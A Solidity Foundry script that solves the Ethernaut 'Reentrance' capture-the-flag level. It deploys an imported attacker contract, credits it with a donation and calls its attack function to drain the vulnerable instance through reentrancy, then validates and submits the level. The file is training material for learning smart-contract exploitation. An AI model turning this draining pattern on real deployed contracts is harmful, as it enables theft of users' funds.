// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../utils/Ethernaut.sol";
import "./Reentrance.sol";
import "./ReentranceAttacker.sol";

contract ReentranceSolver is Test, Ethernaut {
    function run() public {
        IS_TEST = false;
        test();
    }

    function test() public broadcasted {
        Reentrance instance = Reentrance(getLevelInstanceWithValue(Levels.reentrance, 1e15));
        ReentranceAttacker attacker = new ReentranceAttacker(address(instance));

        instance.donate{ value: 2e15 }(address(attacker));
        attacker.attack(instance.balanceOf(address(attacker)));

        require(validateLevelInstance(Levels.reentrance, address(instance)), "no validation");

        if (!IS_TEST) submitLevelInstance(address(instance));
    }
}
